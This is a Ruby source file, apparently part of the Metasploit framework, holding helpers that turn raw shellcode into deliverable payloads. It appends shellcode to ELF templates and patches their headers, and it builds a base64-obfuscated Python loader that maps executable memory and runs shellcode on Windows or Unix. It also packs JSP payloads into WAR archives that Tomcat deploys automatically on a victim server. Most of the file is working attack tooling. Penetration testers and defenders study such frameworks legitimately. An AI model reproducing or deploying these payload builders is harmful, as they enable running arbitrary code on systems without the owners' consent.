module Msf::Util::EXE::Common
  require 'rex'
  require 'rex/peparsey'
  require 'rex/pescan'
  require 'rex/random_identifier'
  require 'rex/zip'
  require 'rex/powershell'
  require 'metasm'
  require 'digest/sha1'

  def self.included(base)
    base.extend(ClassMethods)
  end

  module ClassMethods
    # Generates a ZIP file.
    #
    # @param files [Array<Hash>] Items to compress. Each item is a hash that supports these options:
    #  * :data - The content of the file.
    #  * :fname - The file path in the ZIP file
    #  * :comment - A comment
    # @example Compressing two files, one in a folder called 'test'
    #   Msf::Util::EXE.to_zip([{data: 'AAAA', fname: "file1.txt"}, {data: 'data', fname: 'test/file2.txt'}])
    # @return [String]
    def to_zip(files)
      zip = Rex::Zip::Archive.new

      files.each do |f|
        data    = f[:data]
        fname   = f[:fname]
        comment = f[:comment] || ''
        zip.add_file(fname, data, comment)
      end

      zip.pack
    end

    # Generates a default template
    #
    # @param  opts [Hash] The options hash
    # @option opts [String] :template, the template type for the executable
    # @option opts [String] :template_path, the path for the template
    # @option opts [Bool] :fallback, If there are no options set, default options will be used
    # @param  exe  [String] Template type. If undefined, will use the default.
    # @param  path [String] Where you would like the template to be saved.
    def set_template_default(opts, exe = nil, path = nil)
      # If no path specified, use the default one
      path ||= File.join(Msf::Config.data_directory, "templates")

      # If there's no default name, we must blow it up.
      unless exe
        raise RuntimeError, 'Ack! Msf::Util::EXE.set_template_default called ' +
        'without default exe name!'
      end

      # Use defaults only if nothing is specified
      opts[:template_path] ||= path
      opts[:template] ||= exe

      # Only use the path when the filename contains no separators.
      unless opts[:template].include?(File::SEPARATOR)
        opts[:template] = File.join(opts[:template_path], opts[:template])
      end

      # Check if it exists now
      return if File.file?(opts[:template])
      # If it failed, try the default...
      if opts[:fallback]
        default_template = File.join(path, exe)
        if File.file?(default_template)
          # Perhaps we should warn about falling back to the default?
          opts.merge!({ :fellback => default_template })
          opts[:template] = default_template
        end
      end
    end

    # read_replace_script_template
    #
    # @param filename [String] Name of the file
    # @param hash_sub [Hash]
    def read_replace_script_template(filename, hash_sub)
      template_pathname = File.join(Msf::Config.data_directory, "templates",
                                    "scripts", filename)
      template = ''
      File.open(template_pathname, "rb") {|f| template = f.read}
      template % hash_sub
    end

      # get_file_contents
    #
    # @param perms  [String]
    # @param file   [String]
    # @return       [String]
    def get_file_contents(file, perms = "rb")
      contents = ''
      File.open(file, perms) {|fd| contents = fd.read(fd.stat.size)}
      contents
    end

    # find_payload_tag
    #
    # @param mo       [String]
    # @param err_msg  [String]
    # @raise [RuntimeError] if the "PAYLOAD:" is not found
    # @return         [Integer]
    def find_payload_tag(mo, err_msg)
      bo = mo.index('PAYLOAD:')
      unless bo
        raise RuntimeError, err_msg
      end
      bo
    end

    def elf?(code)
      code[0..3] == "\x7FELF"
    end

    def macho?(code)
      code[0..3] == "\xCF\xFA\xED\xFE" || code[0..3] == "\xCE\xFA\xED\xFE" || code[0..3] == "\xCA\xFE\xBA\xBE"
    end

    # Create an ELF executable containing the payload provided in +code+
    #
    # For the default template, this method just appends the payload, checks if
    # the template is 32 or 64 bit and adjusts the offsets accordingly
    # For user-provided templates, modifies the header to mark all executable
    # segments as writable and overwrites the entrypoint (usually _start) with
    # the payload.
    # @param framework  [Msf::Framework]  The framework of you want to use
    # @param opts       [Hash]
    # @option           [String] :template
    # @param template   [String]
    # @param code       [String]
    # @param big_endian [Boolean]  Set to "false" by default
    # @return           [String]
    def to_exe_elf(framework, opts, template, code, big_endian=false)
      if elf? code
        return code
      end

      # Allow the user to specify their own template
      set_template_default(opts, template)

      # The old way to do it is like other formats, just overwrite a big
      # block of rwx mem with our shellcode.
      #bo = elf.index( "\x90\x90\x90\x90" * 1024 )
      #co = elf.index( " " * 512 )
      #elf[bo, 2048] = [code].pack('a2048') if bo

      # The new template is just an ELF header with its entry point set to
      # the end of the file, so just append shellcode to it and fixup
      # p_filesz and p_memsz in the header for a working ELF executable.
      elf = get_file_contents(opts[:template])
      elf << code

      # Check EI_CLASS to determine if the header is 32 or 64 bit
      # Use the proper offsets and pack size
      case elf[4,1].unpack("C").first
      when 1 # ELFCLASS32 - 32 bit (ruby 1.9+)
        if big_endian
          elf[0x44,4] = [elf.length].pack('N') #p_filesz
          elf[0x48,4] = [elf.length + code.length].pack('N') #p_memsz
        else # little endian
          elf[0x44,4] = [elf.length].pack('V') #p_filesz
          elf[0x48,4] = [elf.length + code.length].pack('V') #p_memsz
        end
      when 2 # ELFCLASS64 - 64 bit (ruby 1.9+)
        if big_endian
          elf[0x60,8] = [elf.length].pack('Q>') #p_filesz
          elf[0x68,8] = [elf.length + code.length].pack('Q>') #p_memsz
        else # little endian
          elf[0x60,8] = [elf.length].pack('Q<') #p_filesz
          elf[0x68,8] = [elf.length + code.length].pack('Q<') #p_memsz
        end
      else
        raise RuntimeError, "Invalid ELF template: EI_CLASS value not supported"
      end

      elf
    end

    def to_python_reflection(framework, arch, code, exeopts)
      unless [ ARCH_X86, ARCH_X64, ARCH_AARCH64, ARCH_ARMLE, ARCH_MIPSBE, ARCH_MIPSLE, ARCH_PPC ].include? arch
        raise "Msf::Util::EXE.to_python_reflection is not compatible with #{arch}"
      end

      python_code = <<~PYTHON
        #{Rex::Text.to_python(code)}
        import ctypes,os
        if os.name == 'nt':
          cbuf = (ctypes.c_char * len(buf)).from_buffer_copy(buf)
          ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
          ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_long(0),ctypes.c_long(len(buf)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
          ctypes.windll.kernel32.RtlMoveMemory.argtypes = [ctypes.c_void_p,ctypes.c_void_p,ctypes.c_int]
          ctypes.windll.kernel32.RtlMoveMemory(ptr,cbuf,ctypes.c_int(len(buf)))
          ctypes.CFUNCTYPE(ctypes.c_int)(ptr)()
        else:
          import mmap
          from ctypes.util import find_library
          c = ctypes.CDLL(find_library('c'))
          c.mmap.restype = ctypes.c_void_p
          ptr = c.mmap(0,len(buf),mmap.PROT_READ|mmap.PROT_WRITE,mmap.MAP_ANONYMOUS|mmap.MAP_PRIVATE,-1,0)
          ctypes.memmove(ptr,buf,len(buf))
          c.mprotect.argtypes = [ctypes.c_void_p,ctypes.c_int,ctypes.c_int]
          c.mprotect(ptr,len(buf),mmap.PROT_READ|mmap.PROT_EXEC)
          ctypes.CFUNCTYPE(ctypes.c_int)(ptr)()
      PYTHON

      "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('#{Rex::Text.encode_base64(python_code)}')[0]))"
    end

    def to_win32pe_psh_msil(framework, code, opts = {})
      Rex::Powershell::Payload.to_win32pe_psh_msil(Rex::Powershell::Templates::TEMPLATE_DIR, code)
    end

    def to_win32pe_psh_rc4(framework, code, opts = {})
      # unlike other to_win32pe_psh_* methods, this expects powershell code, not asm
      # this method should be called after other to_win32pe_psh_* methods to wrap the output
      Rex::Powershell::Payload.to_win32pe_psh_rc4(Rex::Powershell::Templates::TEMPLATE_DIR, code)
    end

    # Creates a Web Archive (WAR) file from the provided jsp code.
    #
    # On Tomcat, WAR files will be deployed into a directory with the same name
    # as the archive, e.g. +foo.war+ will be extracted into +foo/+. If the
    # server is in a default configuration, deoployment will happen
    # automatically. See
    # {http://tomcat.apache.org/tomcat-5.5-doc/config/host.html the Tomcat
    # documentation} for a description of how this works.
    #
    # @param jsp_raw [String] JSP code to be added in a file called +jsp_name+
    #   in the archive. This will be compiled by the victim servlet container
    #   (e.g., Tomcat) and act as the main function for the servlet.
    # @param opts [Hash]
    # @option opts :jsp_name [String] Name of the <jsp-file> in the archive
    #   _without the .jsp extension_. Defaults to random.
    # @option opts :app_name [String] Name of the app to put in the <servlet-name>
    #   tag. Mostly irrelevant, except as an identifier in web.xml. Defaults to
    #   random.
    # @option opts :extra_files [Array<String,String>] Additional files to add
    #   to the archive. First element is filename, second is data
    #
    # @todo Refactor to return a {Rex::Zip::Archive} or {Rex::Zip::Jar}
    #
    # @return [String]
    def to_war(jsp_raw, opts = {})
      jsp_name = opts[:jsp_name]
      jsp_name ||= Rex::Text.rand_text_alpha_lower(rand(8..15))
      app_name = opts[:app_name]
      app_name ||= Rex::Text.rand_text_alpha_lower(rand(8..15))

      meta_inf = [ 0xcafe, 0x0003 ].pack('Vv')
      manifest = "Manifest-Version: 1.0\r\nCreated-By: 1.6.0_17 (Sun Microsystems Inc.)\r\n\r\n"
      web_xml = %q{<?xml version="1.0"?>
  <!DOCTYPE web-app PUBLIC
  "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
  "http://java.sun.com/dtd/web-app_2_3.dtd">
  <web-app>
  <servlet>
  <servlet-name>NAME</servlet-name>
  <jsp-file>/PAYLOAD.jsp</jsp-file>
  </servlet>
  </web-app>
  }
      web_xml.gsub!('NAME', app_name)
      web_xml.gsub!('PAYLOAD', jsp_name)

      zip = Rex::Zip::Archive.new
      zip.add_file('META-INF/', '', meta_inf)
      zip.add_file('META-INF/MANIFEST.MF', manifest)
      zip.add_file('WEB-INF/', '')
      zip.add_file('WEB-INF/web.xml', web_xml)
      # add the payload
      zip.add_file("#{jsp_name}.jsp", jsp_raw)

      # add extra files
      if opts[:extra_files]
        opts[:extra_files].each { |el| zip.add_file(el[0], el[1]) }
      end

      zip.pack
    end
  end

  class << self
    include ClassMethods
  end
end
